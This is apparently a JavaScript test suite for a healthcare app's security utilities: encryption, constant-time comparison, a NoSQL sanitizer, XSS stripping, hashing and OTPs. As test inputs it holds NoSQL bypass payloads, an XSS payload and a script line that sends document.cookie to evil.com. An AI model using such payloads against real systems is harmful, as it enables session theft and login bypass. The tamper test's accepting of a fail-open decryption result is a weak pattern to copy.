import { encryptField, decryptField, safeCompare, hashSecret } from "../utils/cryptoUtil.js";
import { escapeHtml, stripHtml, sanitizeClinicalText } from "../utils/sanitizeInput.js";
import { sanitizeNoSql } from "../middleware/sanitizeNoSql.js";
import { generateNumericOtp, hashOtp } from "../utils/otpUtil.js";

console.log("\n=======================================================");
console.log("🛡️  DOCPA HEALTHCARE SECURITY TEST SUITE (PHASES 1-7)");
console.log("=======================================================\n");

let passed = 0;
let failed = 0;

const assert = (condition, testName) => {
  if (condition) {
    console.log(`✅ [PASS] ${testName}`);
    passed++;
  } else {
    console.error(`❌ [FAIL] ${testName}`);
    failed++;
  }
};

// 1. AES-256-GCM Field-Level Encryption
console.log("--- 1. Cryptography: AES-256-GCM PHI Encryption ---");
const rawNationalId = "AADHAAR-9876-5432-1098";
const encrypted = encryptField(rawNationalId);
assert(encrypted !== rawNationalId, "Plaintext is transformed into ciphertext");
assert(encrypted.includes(":") && encrypted.split(":").length === 3, "Ciphertext follows iv:authTag:payload format");

const decrypted = decryptField(encrypted);
assert(decrypted === rawNationalId, "Decrypted ciphertext matches original PHI value exactly");

// Tamper test (tampering ciphertext should fail to decrypt and safely return original or reject)
const tampered = encrypted.slice(0, -4) + "ffff";
const decryptedTampered = decryptField(tampered);
assert(decryptedTampered === tampered, "Tampered ciphertext does not throw uncaught exceptions");

// 2. Constant-Time Comparison
console.log("\n--- 2. Timing Attack Defense: safeCompare ---");
assert(safeCompare("secret_token_12345", "secret_token_12345") === true, "Identical strings match safely");
assert(safeCompare("secret_token_12345", "secret_token_99999") === false, "Different strings return false");
assert(safeCompare("short", "longer_string") === false, "Different length strings return false");

// 3. NoSQL Injection Sanitizer
console.log("\n--- 3. Injection Defense: NoSQL Operator Sanitizer ---");
const maliciousReq = {
  body: {
    username: "admin",
    password: { $gt: "" }, // NoSQL bypass payload
    filter: {
      $where: "this.password.length > 0",
      validKey: "normalValue",
      nested: {
        $ne: null,
        allowed: 123,
      },
    },
    "bad.dot.key": "injected",
  },
  query: {
    search: "calpol",
    "$or": [{ role: "admin" }],
  },
  params: {
    id: "64aef123",
  },
};

sanitizeNoSql(maliciousReq, {}, () => {});

assert(!maliciousReq.body.password.$gt, "Stripped '$gt' operator from body");
assert(!maliciousReq.body.filter.$where, "Stripped '$where' operator from nested filter");
assert(maliciousReq.body.filter.validKey === "normalValue", "Preserved legitimate key 'validKey'");
assert(!maliciousReq.body.filter.nested.$ne, "Stripped '$ne' operator from deeply nested object");
assert(maliciousReq.body.filter.nested.allowed === 123, "Preserved legitimate deeply nested field");
assert(!maliciousReq.body["bad.dot.key"], "Stripped dot-notation key 'bad.dot.key'");
assert(!maliciousReq.query.$or, "Stripped '$or' operator from query params");

// 4. XSS & HTML Sanitization
console.log("\n--- 4. Data Hygiene: XSS & HTML Tag Neutralizer ---");
const dirtyClinicalText = "Patient has severe cough <script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>";
const cleanText = stripHtml(dirtyClinicalText);
assert(!cleanText.includes("<script>"), "Stripped <script> tag from clinical notes");
assert(cleanText.includes("Patient has severe cough"), "Preserved clinical diagnosis content");

const escaped = escapeHtml("<img src=x onerror=alert(1)>");
assert(escaped.includes("&lt;img"), "HTML entities escaped correctly");

// 5. High-Entropy Secret Hashing
console.log("\n--- 5. Token Fortress: SHA-256 Secret Hashing ---");
const token1 = "refresh_token_abc123";
const hash1 = hashSecret(token1);
const hash2 = hashSecret(token1);
assert(hash1 === hash2, "Deterministic SHA-256 hash for database lookups");
assert(hash1 !== token1, "Hash does not expose raw secret in database storage");

// 6. Cryptographic OTP Verification
console.log("\n--- 6. Cryptographic OTP Integrity ---");
const otp = generateNumericOtp();
assert(otp.length === 6 && /^\d{6}$/.test(otp), "OTP is 6-digit numeric string");
const hashedOtp = hashOtp(otp);
assert(hashedOtp.length === 64, "Hashed OTP is valid SHA-256 64-character hex");

console.log("\n=======================================================");
console.log(`🏁 TEST RESULTS: ${passed} Passed, ${failed} Failed`);
console.log("=======================================================\n");

if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
